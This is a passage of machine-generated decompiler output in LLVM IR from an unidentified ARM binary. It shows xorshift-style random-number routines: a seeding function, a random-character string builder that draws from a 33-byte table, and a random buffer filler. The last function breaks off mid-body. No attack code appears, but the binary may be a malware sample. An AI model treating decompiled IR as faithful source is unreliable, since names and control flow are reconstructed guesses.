  %v2_fe84 = load i32, i32* @global_var_1ec30.164, align 4
  %v2_fe88 = load i32, i32* @global_var_1ec34.166, align 4
  %v2_fe8c = xor i32 %v5_fe80, %v5_fe7c
  %v4_fe90 = udiv i32 %v5_fe7c, 256
  %v5_fe90 = xor i32 %v2_fe8c, %v4_fe90
  store i32 %v2_fe84, i32* @global_var_1ec2c.160, align 4
  store i32 %v2_fe88, i32* @global_var_1ec30.164, align 4
  store i32 %v2_fe70, i32* @global_var_1ec34.166, align 4
  store i32 %v5_fe90, i32* @global_var_1ec38.162, align 4
  ret i32 %v5_fe90

; uselistorder directives
  uselistorder i32 %v2_fe70, { 2, 1, 0 }
  uselistorder i32 %v2_fe6c, { 1, 0 }
}

define i32 @function_feb8(i32 %arg1) local_unnamed_addr {
dec_label_pc_feb8:
  %stack_var_-12 = alloca i32, align 4
  %v3_feb8 = load i32, i32* @r4, align 4
  store i32 %v3_feb8, i32* %stack_var_-12, align 4
  %v2_fec0 = call i32 @function_1396c(i32* null)
  store i32 %v2_fec0, i32* @global_var_1ec2c.160, align 4
  %v0_fecc = call i32 @function_136f4()
  store i32 %v0_fecc, i32* @r4, align 4
  %v0_fed4 = call i32 @function_13720()
  %v0_fedc = load i32, i32* @r4, align 4
  %v2_fedc = xor i32 %v0_fedc, %v0_fed4
  store i32 %v2_fedc, i32* @r4, align 4
  store i32 %v2_fedc, i32* @global_var_1ec30.164, align 4
  %v1_fee4 = call i32 @function_13c7c(i32 %v0_fed4)
  %v2_fee8 = load i32, i32* @global_var_1ec30.164, align 4
  %v2_fef4 = xor i32 %v2_fee8, %v1_fee4
  store i32 %v2_fef4, i32* @global_var_1ec38.162, align 4
  store i32 %v1_fee4, i32* @global_var_1ec34.166, align 4
  %v2_ff00 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_ff00, i32* @r4, align 4
  ret i32 %v1_fee4

; uselistorder directives
  uselistorder i32 %v1_fee4, { 1, 2, 0 }
  uselistorder i32 %v0_fed4, { 1, 0 }
  uselistorder i32 ()* @function_13720, { 1, 2, 0 }
}

define i32 @function_ff14(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_ff14:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-69 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_ff14 = load i32, i32* @r4, align 4
  store i32 %v3_ff14, i32* %stack_var_-36, align 4
  store i32 %arg2, i32* %r8.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 ptrtoint ([33 x i8]* @global_var_16018.172 to i32), i32* @r1, align 4
  %v2_ff28 = ptrtoint i32* %stack_var_-69 to i32
  store i32 %v2_ff28, i32* @r0, align 4
  store i32 33, i32* @r2, align 4
  %v4_ff30 = call i32 @function_13cb0(i32 %v2_ff28, i32 ptrtoint ([33 x i8]* @global_var_16018.172 to i32), i32 33)
  store i32 %v4_ff30, i32* %r0.global-to-local, align 4
  %v0_ff34 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_ff34 = icmp slt i32 %v0_ff34, 0
  store i1 %v1_ff34, i1* %cpsr_n.global-to-local, align 1
  %v2_ff34 = icmp eq i32 %v0_ff34, 0
  store i1 %v2_ff34, i1* %cpsr_z.global-to-local, align 1
  %tmp20 = icmp slt i32 %v0_ff34, 1
  br i1 %tmp20, label %dec_label_pc_10020, label %dec_label_pc_ff3c

dec_label_pc_ff3c:                                ; preds = %dec_label_pc_ff14
  store i32 ptrtoint (i32* @global_var_1ec38.162 to i32), i32* %fp.global-to-local, align 4
  %v2_ff48 = load i32, i32* @global_var_1ec34.166, align 4
  store i32 %v2_ff48, i32* %sb.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ec2c.160 to i32), i32* %r3.global-to-local, align 4
  %v2_ff50 = load i32, i32* @global_var_1ec30.164, align 4
  store i32 %v2_ff50, i32* %sl.global-to-local, align 4
  %v2_ff54 = load i32, i32* @global_var_1ec38.162, align 4
  store i32 %v2_ff54, i32* %r6.global-to-local, align 4
  %v2_ff58 = load i32, i32* @global_var_1ec2c.160, align 4
  store i32 %v2_ff58, i32* %ip.global-to-local, align 4
  %v0_ff5c = load i32, i32* @r4, align 4
  %v1_ff5c = add i32 %v0_ff5c, 1
  store i32 %v1_ff5c, i32* %r7.global-to-local, align 4
  %v2_ff68 = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_ffc8

dec_label_pc_ff64:                                ; preds = %dec_label_pc_ffc8
  %v1_ff64 = udiv i32 %v5_ffd4, 8
  %v4_ff6c = urem i32 %v1_ff64, 32
  %v5_ff6c = add i32 %v4_ff6c, %v2_ff68
  store i32 %v5_ff6c, i32* %r0.global-to-local, align 4
  %v3_ff70 = mul i32 %v5_ffd4, 65536
  store i32 %v3_ff70, i32* %r2.global-to-local, align 4
  store i32 %v2_ff68, i32* %r3.global-to-local, align 4
  %v3_ff78 = mul i32 %v5_ffd4, 256
  store i32 %v3_ff78, i32* %r1.global-to-local, align 4
  %tmp21 = udiv i32 %v5_ffd4, 2048
  %v4_ff7c = urem i32 %tmp21, 32
  %v5_ff7c = add i32 %v4_ff7c, %v2_ff68
  store i32 %v5_ff7c, i32* %ip.global-to-local, align 4
  %tmp22 = udiv i32 %v5_ffd4, 524288
  %v4_ff80 = urem i32 %tmp22, 32
  %v5_ff80 = add i32 %v4_ff80, %v2_ff68
  store i32 %v5_ff80, i32* @lr, align 4
  %v4_ff84 = udiv i32 %v2_ffd0, 134217728
  %v5_ff84 = add i32 %v4_ff84, %v2_ff68
  %v1_ff88 = add i32 %v5_ff7c, -33
  %v2_ff88 = inttoptr i32 %v1_ff88 to i8*
  %v3_ff88 = load i8, i8* %v2_ff88, align 1
  %v4_ff88 = zext i8 %v3_ff88 to i32
  store i32 %v4_ff88, i32* %r2.global-to-local, align 4
  %v1_ff8c = add i32 %v5_ff6c, -33
  %v2_ff8c = inttoptr i32 %v1_ff8c to i8*
  %v3_ff8c = load i8, i8* %v2_ff8c, align 1
  %v4_ff8c = zext i8 %v3_ff8c to i32
  store i32 %v4_ff8c, i32* %r3.global-to-local, align 4
  %v1_ff90 = add i32 %v5_ff80, -33
  %v2_ff90 = inttoptr i32 %v1_ff90 to i8*
  %v3_ff90 = load i8, i8* %v2_ff90, align 1
  %v4_ff90 = zext i8 %v3_ff90 to i32
  store i32 %v4_ff90, i32* %r1.global-to-local, align 4
  %v1_ff94 = add i32 %v5_ff84, -33
  %v2_ff94 = inttoptr i32 %v1_ff94 to i8*
  %v3_ff94 = load i8, i8* %v2_ff94, align 1
  %v4_ff94 = zext i8 %v3_ff94 to i32
  store i32 %v4_ff94, i32* %r0.global-to-local, align 4
  %v1_ff98 = add i32 %v0_ff98, -4
  store i32 %v1_ff98, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_ff9c = icmp slt i32 %v1_ff98, 0
  store i1 %v1_ff9c, i1* %cpsr_n.global-to-local, align 1
  %v2_ff9c = icmp eq i32 %v1_ff98, 0
  store i1 %v2_ff9c, i1* %cpsr_z.global-to-local, align 1
  %v3_ffa0 = add i32 %v2_ffa0, -1
  %v4_ffa0 = inttoptr i32 %v3_ffa0 to i8*
  store i8 %v3_ff8c, i8* %v4_ffa0, align 1
  %v0_ffa4 = load i32, i32* %r2.global-to-local, align 4
  %v1_ffa4 = trunc i32 %v0_ffa4 to i8
  %v2_ffa4 = load i32, i32* %r7.global-to-local, align 4
  %v3_ffa4 = inttoptr i32 %v2_ffa4 to i8*
  store i8 %v1_ffa4, i8* %v3_ffa4, align 1
  %v0_ffa8 = load i32, i32* %r1.global-to-local, align 4
  %v1_ffa8 = trunc i32 %v0_ffa8 to i8
  %v2_ffa8 = load i32, i32* %r7.global-to-local, align 4
  %v3_ffa8 = add i32 %v2_ffa8, 1
  %v4_ffa8 = inttoptr i32 %v3_ffa8 to i8*
  store i8 %v1_ffa8, i8* %v4_ffa8, align 1
  %v0_ffac = load i32, i32* %r0.global-to-local, align 4
  %v1_ffac = trunc i32 %v0_ffac to i8
  %v2_ffac = load i32, i32* %r7.global-to-local, align 4
  %v3_ffac = add i32 %v2_ffac, 2
  %v4_ffac = inttoptr i32 %v3_ffac to i8*
  store i8 %v1_ffac, i8* %v4_ffac, align 1
  %v0_ffb0 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_ffb0, i32* %ip.global-to-local, align 4
  %v0_ffb4 = load i32, i32* %r7.global-to-local, align 4
  %v1_ffb4 = add i32 %v0_ffb4, 4
  store i32 %v1_ffb4, i32* %r7.global-to-local, align 4
  %v0_ffb8 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_ffb8 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_ffb8 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v3_ffb8 = xor i1 %v1_ffb8, %v2_ffb8
  %v4_ffb8 = or i1 %v0_ffb8, %v3_ffb8
  br i1 %v4_ffb8, label %dec_label_pc_10004, label %dec_label_pc_ffbc

dec_label_pc_ffbc:                                ; preds = %dec_label_pc_ffe8, %dec_label_pc_ff64
  %v2_ffa06 = phi i32 [ %v1_fffc, %dec_label_pc_ffe8 ], [ %v1_ffb4, %dec_label_pc_ff64 ]
  %v0_ffc82 = phi i32 [ %v0_fff8, %dec_label_pc_ffe8 ], [ %v0_ffb0, %dec_label_pc_ff64 ]
  %v0_ffbc = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_ffbc, i32* %sl.global-to-local, align 4
  %v0_ffc0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_ffc0, i32* %sb.global-to-local, align 4
  %v0_ffc4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_ffc4, i32* %r6.global-to-local, align 4
  %v0_ffd8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_ffc8

dec_label_pc_ffc8:                                ; preds = %dec_label_pc_ff3c, %dec_label_pc_ffbc
  %v2_ffa0 = phi i32 [ %v1_ff5c, %dec_label_pc_ff3c ], [ %v2_ffa06, %dec_label_pc_ffbc ]
  %v0_ff98 = phi i32 [ %v0_ff34, %dec_label_pc_ff3c ], [ %v0_ffd8.pre, %dec_label_pc_ffbc ]
  %v0_ffcc = phi i32 [ %v2_ff54, %dec_label_pc_ff3c ], [ %v0_ffc4, %dec_label_pc_ffbc ]
  %v0_ffc8 = phi i32 [ %v2_ff58, %dec_label_pc_ff3c ], [ %v0_ffc82, %dec_label_pc_ffbc ]
  %v4_ffc8 = mul i32 %v0_ffc8, 2048
  %v5_ffc8 = xor i32 %v4_ffc8, %v0_ffc8
  store i32 %v5_ffc8, i32* %r3.global-to-local, align 4
  %v4_ffcc = udiv i32 %v0_ffcc, 524288
  %v5_ffcc = xor i32 %v4_ffcc, %v0_ffcc
  %v2_ffd0 = xor i32 %v5_ffcc, %v5_ffc8
  store i32 %v2_ffd0, i32* %r2.global-to-local, align 4
  %v4_ffd4 = udiv i32 %v5_ffc8, 256
  %v5_ffd4 = xor i32 %v4_ffd4, %v2_ffd0
  store i32 %v5_ffd4, i32* %r5.global-to-local, align 4
  %v1_ffd8 = add i32 %v0_ff98, -3
  %v2_ffd8 = icmp ugt i32 %v0_ff98, 2
  %v3_ffd8 = sub i32 2, %v0_ff98
  %v4_ffd8 = and i32 %v3_ffd8, %v0_ff98
  %v5_ffd8 = icmp slt i32 %v4_ffd8, 0
  store i1 %v5_ffd8, i1* %cpsr_v.global-to-local, align 1
  %v6_ffd8 = icmp slt i32 %v1_ffd8, 0
  store i1 %v6_ffd8, i1* %cpsr_n.global-to-local, align 1
  %v7_ffd8 = icmp eq i32 %v0_ff98, 3
  store i1 %v7_ffd8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_ffd4, i32* %r0.global-to-local, align 4
  store i32 33, i32* %r1.global-to-local, align 4
  %v2_ffe4 = xor i1 %v7_ffd8, true
  %v3_ffe4 = and i1 %v2_ffd8, %v2_ffe4
  br i1 %v3_ffe4, label %dec_label_pc_ff64, label %dec_label_pc_ffe8

dec_label_pc_ffe8:                                ; preds = %dec_label_pc_ffc8
  %v2_ffe8 = call i32 @function_133f8(i32 %v5_ffd4, i32 33)
  store i32 %v2_ffe8, i32* %r0.global-to-local, align 4
  %v0_ffec = load i32, i32* %r8.global-to-local, align 4
  %v1_ffec = add i32 %v0_ffec, -1
  store i32 %v1_ffec, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_fff0 = icmp slt i32 %v1_ffec, 0
  store i1 %v1_fff0, i1* %cpsr_n.global-to-local, align 1
  %v2_fff0 = icmp eq i32 %v1_ffec, 0
  store i1 %v2_fff0, i1* %cpsr_z.global-to-local, align 1
  %v1_fff4 = trunc i32 %v2_ffe8 to i8
  %v2_fff4 = load i32, i32* %r7.global-to-local, align 4
  %v3_fff4 = add i32 %v2_fff4, -1
  %v4_fff4 = inttoptr i32 %v3_fff4 to i8*
  store i8 %v1_fff4, i8* %v4_fff4, align 1
  %v0_fff8 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_fff8, i32* %ip.global-to-local, align 4
  %v0_fffc = load i32, i32* %r7.global-to-local, align 4
  %v1_fffc = add i32 %v0_fffc, 1
  store i32 %v1_fffc, i32* %r7.global-to-local, align 4
  %v0_10000 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_10000 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_10000 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v3_10000 = xor i1 %v1_10000, %v2_10000
  %v4_10000 = or i1 %v0_10000, %v3_10000
  br i1 %v4_10000, label %dec_label_pc_10004, label %dec_label_pc_ffbc

dec_label_pc_10004:                               ; preds = %dec_label_pc_ffe8, %dec_label_pc_ff64
  store i32 ptrtoint (i32* @global_var_1ec30.164 to i32), i32* %r3.global-to-local, align 4
  %v0_1000c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1000c, i32* @global_var_1ec34.166, align 4
  store i32 ptrtoint (i32* @global_var_1ec2c.160 to i32), i32* %ip.global-to-local, align 4
  %v0_10014 = load i32, i32* %r5.global-to-local, align 4
  %v1_10014 = load i32, i32* %fp.global-to-local, align 4
  %v2_10014 = inttoptr i32 %v1_10014 to i32*
  store i32 %v0_10014, i32* %v2_10014, align 4
  %v0_10018 = load i32, i32* %sb.global-to-local, align 4
  %v1_10018 = load i32, i32* %r3.global-to-local, align 4
  %v2_10018 = inttoptr i32 %v1_10018 to i32*
  store i32 %v0_10018, i32* %v2_10018, align 4
  %v0_1001c = load i32, i32* %sl.global-to-local, align 4
  %v1_1001c = load i32, i32* %ip.global-to-local, align 4
  %v2_1001c = inttoptr i32 %v1_1001c to i32*
  store i32 %v0_1001c, i32* %v2_1001c, align 4
  %v2_10024.pre = load i32, i32* %stack_var_-36, align 4
  %v29_10024.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10020

dec_label_pc_10020:                               ; preds = %dec_label_pc_ff14, %dec_label_pc_10004
  %v29_10024 = phi i32 [ %v29_10024.pre, %dec_label_pc_10004 ], [ %v4_ff30, %dec_label_pc_ff14 ]
  %v2_10024 = phi i32 [ %v2_10024.pre, %dec_label_pc_10004 ], [ %v3_ff14, %dec_label_pc_ff14 ]
  store i32 %v2_10024, i32* @r4, align 4
  ret i32 %v29_10024

; uselistorder directives
  uselistorder i32 %v1_fffc, { 1, 0 }
  uselistorder i32 %v0_fff8, { 1, 0 }
  uselistorder i32 %v5_ffd4, { 6, 5, 7, 4, 1, 0, 3, 2 }
  uselistorder i32 %v2_ffd0, { 1, 2, 0 }
  uselistorder i32 %v0_ffc8, { 1, 0 }
  uselistorder i32 %v0_ffcc, { 1, 0 }
  uselistorder i32 %v0_ff98, { 2, 0, 5, 4, 3, 1 }
  uselistorder i32 %v2_ff68, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_ff34, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %sl.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r8.global-to-local, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32* %r1.global-to-local, { 4, 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 4, 1, 2, 3, 7, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 -33, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_10020, { 1, 0 }
  uselistorder label %dec_label_pc_ffc8, { 1, 0 }
}

define i32 @function_1003c(i8* %arg1) local_unnamed_addr {
dec_label_pc_1003c:
  %fp.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %v3_1003c = load i32, i32* @r4, align 4
  store i32 %v3_1003c, i32* %stack_var_-36, align 4
  %v9_1003c = load i32, i32* @r6, align 4
  %v12_1003c = load i32, i32* @r7, align 4
  %v15_1003c = load i32, i32* @r8, align 4
  %v18_1003c = load i32, i32* @sb, align 4
  %v21_1003c = load i32, i32* @sl, align 4
  %v24_1003c = load i32, i32* @fp, align 4
  %v0_10040 = load i32, i32* @r1, align 4
  store i32 %v0_10040, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %tmp20 = icmp slt i32 %v0_10040, 1
  br i1 %tmp20, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_1003c
  store i32 %v3_1003c, i32* @r4, align 4
  ret i32 %tmp

bb21:                                             ; preds = %dec_label_pc_1003c
  store i32 ptrtoint (i32* @global_var_1ec38.162 to i32), i32* %fp.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ec34.166 to i32), i32* %sb.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ec30.164 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ec2c.160 to i32), i32* %r8.global-to-local, align 4
  %v2_1005c = load i32, i32* @global_var_1ec38.162, align 4
  store i32 %v2_1005c, i32* @lr, align 4
  %v2_10060 = load i32, i32* @global_var_1ec34.166, align 4
  store i32 %v2_10060, i32* %r7.global-to-local, align 4
  %v2_10064 = load i32, i32* @global_var_1ec30.164, align 4
  store i32 %v2_10064, i32* %r6.global-to-local, align 4
  %v2_10068 = load i32, i32* @global_var_1ec2c.160, align 4
  br label %dec_label_pc_10094

dec_label_pc_10070:                               ; preds = %dec_label_pc_100c0
  %v3_100c8 = sdiv i32 %v5_100ac, 256
  %v1_10070 = trunc i32 %v3_100c8 to i8
  %v3_10070 = add i32 %v9_100b4, 1
  %v4_10070 = inttoptr i32 %v3_10070 to i8*
  store i8 %v1_10070, i8* %v4_10070, align 1
  %v0_10074 = load i32, i32* %r3.global-to-local, align 4
  %v1_10074 = trunc i32 %v0_10074 to i8
  %v2_10074 = load i32, i32* %r5.global-to-local, align 4
  %v3_10074 = inttoptr i32 %v2_10074 to i8*
  store i8 %v1_10074, i8* %v3_10074, align 1
  %v0_10078 = load i32, i32* %r5.global-to-local, align 4
  %v1_10078 = add i32 %v0_10078, 2
  store i32 %v1_10078, i32* %r5.global-to-local, align 4
  %v0_1007c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1007c

dec_label_pc_1007c:                               ; preds = %.thread, %dec_label_pc_10070
  %v0_1007c = phi i32 [ %v9_100b8, %.thread ], [ %v0_1007c.pre, %dec_label_pc_10070 ]
  %v2_100707 = phi i32 [ %v12_100b4, %.thread ], [ %v1_10078, %dec_label_pc_10070 ]
  %tmp22 = icmp slt i32 %v0_1007c, 1
  br i1 %tmp22, label %dec_label_pc_100fc, label %dec_label_pc_10088

dec_label_pc_10088:                               ; preds = %dec_label_pc_1007c
  %v0_10080 = load i32, i32* %r6.global-to-local, align 4
  %v0_10088 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_10088, i32* %r6.global-to-local, align 4
  %v0_1008c = load i32, i32* @lr, align 4
  store i32 %v0_1008c, i32* %r7.global-to-local, align 4
  %v0_10090 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_10090, i32* @lr, align 4
  br label %dec_label_pc_10094

dec_label_pc_10094:                               ; preds = %bb21, %dec_label_pc_10088
  %v0_100e4 = phi i32 [ %v2_10064, %bb21 ], [ %v0_10088, %dec_label_pc_10088 ]
  %v9_100b4 = phi i32 [ %tmp, %bb21 ], [ %v2_100707, %dec_label_pc_10088 ]
  %v0_100cc = phi i32 [ %v0_10040, %bb21 ], [ %v0_1007c, %dec_label_pc_10088 ]
  %v0_100d8 = phi i32 [ %v2_1005c, %bb21 ], [ %v0_10090, %dec_label_pc_10088 ]
  %v0_100d4 = phi i32 [ %v2_10068, %bb21 ], [ %v0_10080, %dec_label_pc_10088 ]
  %v4_10094 = mul i32 %v0_100d4, 2048
  %v5_10094 = xor i32 %v4_10094, %v0_100d4
  %v4_10098 = udiv i32 %v0_100d8, 524288
  %v5_10098 = xor i32 %v4_10098, %v0_100d8
  %v2_1009c = xor i32 %v5_10098, %v5_10094
  %v4_100ac = udiv i32 %v5_10094, 256
  %v5_100ac = xor i32 %v4_100ac, %v2_1009c
  store i32 %v5_100ac, i32* %r3.global-to-local, align 4
  %v7_100b4 = icmp sgt i32 %v0_100cc, 3
  br i1 %v7_100b4, label %.thread, label %dec_label_pc_100c0

.thread:                                          ; preds = %dec_label_pc_10094
  %v10_100b4 = inttoptr i32 %v9_100b4 to i32*
  store i32 %v5_100ac, i32* %v10_100b4, align 4
  %v11_100b4 = load i32, i32* %r5.global-to-local, align 4
  %v12_100b4 = add i32 %v11_100b4, 4
  store i32 %v12_100b4, i32* %r5.global-to-local, align 4
  %v8_100b8 = load i32, i32* %r4.global-to-local, align 4
  %v9_100b8 = add i32 %v8_100b8, -4
  store i32 %v9_100b8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1007c

dec_label_pc_100c0:                               ; preds = %dec_label_pc_10094
  store i32 %v5_100ac, i32* %r3.global-to-local, align 4
  %v7_100c4 = icmp eq i32 %v0_100cc, 1
  %v1_100cc = add i32 %v0_100cc, -2
  store i32 %v1_100cc, i32* %r4.global-to-local, align 4
  br i1 %v7_100c4, label %dec_label_pc_100d4, label %dec_label_pc_10070

dec_label_pc_100d4:                               ; preds = %dec_label_pc_100c0
  store i32 %v5_100ac, i32* %r3.global-to-local, align 4
  %v1_100e4 = load i32, i32* %r8.global-to-local, align 4
  %v2_100e4 = inttoptr i32 %v1_100e4 to i32*
  store i32 %v0_100e4, i32* %v2_100e4, align 4
  %v0_100e8 = load i32, i32* %r7.global-to-local, align 4
  %v1_100e8 = load i32, i32* %sl.global-to-local, align 4
  %v2_100e8 = inttoptr i32 %v1_100e8 to i32*
  store i32 %v0_100e8, i32* %v2_100e8, align 4
  %v0_100ec = load i32, i32* @lr, align 4
  %v1_100ec = load i32, i32* %sb.global-to-local, align 4
  %v2_100ec = inttoptr i32 %v1_100ec to i32*
  store i32 %v0_100ec, i32* %v2_100ec, align 4
  %v0_100f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_100f0 = load i32, i32* %fp.global-to-local, align 4
  %v2_100f0 = inttoptr i32 %v1_100f0 to i32*
  store i32 %v0_100f0, i32* %v2_100f0, align 4
  %v0_100f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_100f4 = trunc i32 %v0_100f4 to i8
  %v2_100f4 = load i32, i32* %r5.global-to-local, align 4
  %v3_100f4 = inttoptr i32 %v2_100f4 to i8*
  store i8 %v1_100f4, i8* %v3_100f4, align 1
  %v2_100f8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_100f8, i32* @r4, align 4
  store i32 %v9_1003c, i32* @r6, align 4
  store i32 %v12_1003c, i32* @r7, align 4
  store i32 %v15_1003c, i32* @r8, align 4
  store i32 %v18_1003c, i32* @sb, align 4
  store i32 %v21_1003c, i32* @sl, align 4
  store i32 %v24_1003c, i32* @fp, align 4
  ret i32 %v5_10094

dec_label_pc_100fc:                               ; preds = %dec_label_pc_1007c
  %v0_100fc = load i32, i32* %r3.global-to-local, align 4
  %v1_100fc = load i32, i32* %fp.global-to-local, align 4
  %v2_100fc = inttoptr i32 %v1_100fc to i32*
  store i32 %v0_100fc, i32* %v2_100fc, align 4
  %v0_10100 = load i32, i32* @lr, align 4
  %v1_10100 = load i32, i32* %sb.global-to-local, align 4
  %v2_10100 = inttoptr i32 %v1_10100 to i32*
  store i32 %v0_10100, i32* %v2_10100, align 4
  %v0_10104 = load i32, i32* %r7.global-to-local, align 4
  %v1_10104 = load i32, i32* %sl.global-to-local, align 4
  %v2_10104 = inttoptr i32 %v1_10104 to i32*
  store i32 %v0_10104, i32* %v2_10104, align 4
  %v0_10108 = load i32, i32* %r6.global-to-local, align 4
  %v1_10108 = load i32, i32* %r8.global-to-local, align 4
  %v2_10108 = inttoptr i32 %v1_10108 to i32*
  store i32 %v0_10108, i32* %v2_10108, align 4
  %v2_1010c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1010c, i32* @r4, align 4
  store i32 %v9_1003c, i32* @r6, align 4
  store i32 %v12_1003c, i32* @r7, align 4
  store i32 %v15_1003c, i32* @r8, align 4
  store i32 %v18_1003c, i32* @sb, align 4
  store i32 %v21_1003c, i32* @sl, align 4
  store i32 %v24_1003c, i32* @fp, align 4
  ret i32 %v5_10094

; uselistorder directives
  uselistorder i32 %v9_100b8, { 1, 0 }
  uselistorder i32 %v12_100b4, { 1, 0 }
  uselistorder i32 %v5_100ac, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v5_10094, { 1, 2, 0, 3 }
  uselistorder i32 %v0_100d4, { 1, 0 }
  uselistorder i32 %v0_100d8, { 1, 0 }
  uselistorder i32 %v0_1007c, { 1, 0 }
  uselistorder i32 %v24_1003c, { 1, 0 }
  uselistorder i32 %v21_1003c, { 1, 0 }
  uselistorder i32 %v18_1003c, { 1, 0 }
  uselistorder i32 %v15_1003c, { 1, 0 }
  uselistorder i32 %v12_1003c, { 1, 0 }
  uselistorder i32 %v9_1003c, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 5, 0, 3, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 5, 0, 1, 2, 4, 7, 6, 3 }
  uselistorder i32* @global_var_1ec2c.160, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32* @global_var_1ec30.164, { 2, 3, 4, 1, 0, 5, 6 }
  uselistorder i32* @global_var_1ec34.166, { 3, 6, 1, 4, 2, 0, 5 }
  uselistorder i32* @global_var_1ec38.162, { 2, 3, 5, 1, 0, 4 }
  uselistorder label %dec_label_pc_10094, { 1, 0 }
}

define i32 @function_10120(i32 %arg1) local_unnamed_addr {
dec_label_pc_10120:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10120 = load i32, i32* @r4, align 4
  store i32 %v3_10120, i32* %stack_var_-8, align 4
  %v6_10120 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_10124 = icmp eq i32 %arg1, 0
  br i1 %v2_10124, label %bb, label %bb3

bb:                                               ; preds = %dec_label_pc_10120
  store i32 %v3_10120, i32* @r4, align 4
  ret i32 0

bb3:                                              ; preds = %dec_label_pc_10120
  %v1_1012c = add i32 %arg1, 4
  %v2_1012c = inttoptr i32 %v1_1012c to i32*
  %v3_1012c = load i32, i32* %v2_1012c, align 4
  %v1_10134 = icmp ne i32 %v3_1012c, 0
  call void @__pseudo_cond_branch(i1 %v1_10134, i32 ptrtoint (i32* @global_var_142ec.59 to i32))
  %v0_10138 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10138, i32* @r0, align 4
  %v2_1013c = load i32, i32* %stack_var_-8, align 4
